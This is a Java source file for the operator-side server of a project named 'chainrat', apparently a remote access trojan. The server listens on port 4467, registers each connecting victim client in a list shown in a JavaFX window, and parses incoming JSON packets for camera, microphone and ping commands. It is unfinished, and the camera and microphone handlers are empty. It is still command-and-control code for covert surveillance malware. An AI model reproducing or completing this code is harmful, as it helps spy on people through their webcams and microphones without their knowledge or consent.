package com.nefi.chainrat.server.network;



import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;
import com.nefi.chainrat.server.Main;
import com.nefi.chainrat.server.frmMainController;
import com.nefi.chainrat.server.log.Log;
import com.nefi.chainrat.server.network.response.CameraResponsePacket;
import javafx.application.Platform;

import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Type;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Server implements Runnable {

    private static final int PORT = 4467;
    private Log log = new Log();
    // Hashmap to store active clients as [ID, Object]
    public static HashMap<Integer, ClientHandler> clientMap = new HashMap<>();
    // counter for clients
    static int id = 0;

    @Override
    public void run() {
        //Thread Entry
        open();
    }

    private void open(){
        System.out.println("START");
        log.d(this, "Starting server...");
        try (ServerSocket listener = new ServerSocket(PORT)) {
            log.d(this, "The capitalization server is running...");
            ExecutorService pool = Executors.newFixedThreadPool(20);
            while (true) {
                //Accept Connection in new Thread
                ClientHandler myCap = new ClientHandler(listener.accept(), "client"+id);
                //Make a hashmap for my connections
                clientMap.put(id, myCap);
                //Increase ID
                id++;
                //Update UI
                Platform.runLater(new Runnable() {
                    public void run() {
                        //Get instance of main Window
                        frmMainController mainController = Main.getMainController();
                        //Update Hashmap
                        mainController.clMap = clientMap;
                        mainController.updateListview();
                    }
                });

                pool.execute(myCap);
            }
        }catch (Exception ex){
            log.d(this, "Error starting Server! Try again...");
            ex.printStackTrace();
            open();
        }
    }

    public static class ClientHandler implements Runnable {
        private static final int TIMEOUT_IN_SEC = 20 * 5;
        private Socket socket;
        private Scanner in;
        private PrintWriter out;
        private Log log;
        private int timer = 255;
        private boolean connected = true;
        IPacket packet;

        ClientHandler(Socket socket, String name) {
            this.log = new Log();
            this.socket = socket;
            log.d(this, "Connected! Spawned new thread... " + Log.newLine + "Socket:" + Log.newLine + socket);
        }

        public String readAsString(){
            String line;
            String packetString = "";
            log.d(this, "Trying to read...");
            while (in.hasNextLine()){
                line = in.nextLine();
                if (!line.equals("#")) {
                    log.d(this, "From server: " + line);
                    packetString = line;
                }else {
                    return packetString;
                }
            }
            return packetString;
        }

        public IPacket read(){
            String sPacket = readAsString();
            log.d(this, "Starting GSON Deserialization!");
            try{

                log.d(this, "Trying to get type from packet: " + sPacket);
                JsonObject jsonObject = new Gson().fromJson(sPacket, JsonObject.class);
                String sType = jsonObject.get("type").getAsString();
                log.d(this, "TYPE: " + sType);

                log.d(timer, "Switch...");
                GsonBuilder gsonBuilder = new GsonBuilder();
                Gson gson = gsonBuilder.create();
                IPacket myPacket = null;
                switch (sType){
                    case "CameraResponsePacket":
                        log.d(this, "Inside CameraResponsePacket.");
                        myPacket = gson.fromJson(sPacket, CameraResponsePacket.class);
                        break;
                    case "PingPongPacket":
                        log.d(this, "Inside Ping");
                        System.out.println("PONG!");
                        break;
                    default:
                            throw new Exception();
                }
                //Packet is not null

                //Exec command
                log.d(this, "Sucess!");
                return myPacket;
            }catch (Exception ex){
                log.d(this, "Error couldjnt cast json!" + ex.getMessage());
                return null;
            }
        }

        public void send(IPacket packet, Type typeOfClass){
            GsonBuilder gb = new GsonBuilder();
            Gson gson = gb.create();
            String sCommand = gson.toJson(packet, typeOfClass);
            sendString(sCommand);
        }

        public void sendString(String msg){
            log.d(this, "Sending string...");
            out.println(msg);
            out.println("#");
        }

        @Override
        public void run() {
            try {
                //Incoming packets
                in = new Scanner(socket.getInputStream());
                //Outgoing connection
                out = new PrintWriter(socket.getOutputStream(), true);

                while (connected) {
                    log.d(this, "Starting loop...");

                    //Timeout check / keep alive
                    /*
                    if(timer > TIMEOUT_IN_SEC){
                        IPacket p = new PingPongPacket();
                        send(p, PingPongPacket.class);
                        if(readAsString() == "PONG!"){
                            log.d(this, "GOT THAT PONG!");
                        }else {
                            connected = false;
                            log.d(this, "Client not reachable, closing Thread...");
                        }
                    }*/

                    IPacket packet = read();
                    if(packet == null){
                        log.d(this, "Packet not valid! Breaking loop!");
                        break;
                    }

                    //Switch for type
                    switch (packet.type()){
                        case PING:
                            break;
                        case CAMERA:
                            break;
                        case MICROPHONE:
                            break;
                        default:
                                throw new Exception();
                    }

                    //Sleep
                    Thread.sleep(200);
                    timer++;
                }
                log.d(this, "Closing connection thread...");
            } catch (Exception e) {
                System.out.println("Error:" + socket);
            } finally {
                try { socket.close(); } catch (IOException e) {}
                System.out.println("Closed: " + socket);
            }
        }

    }
}
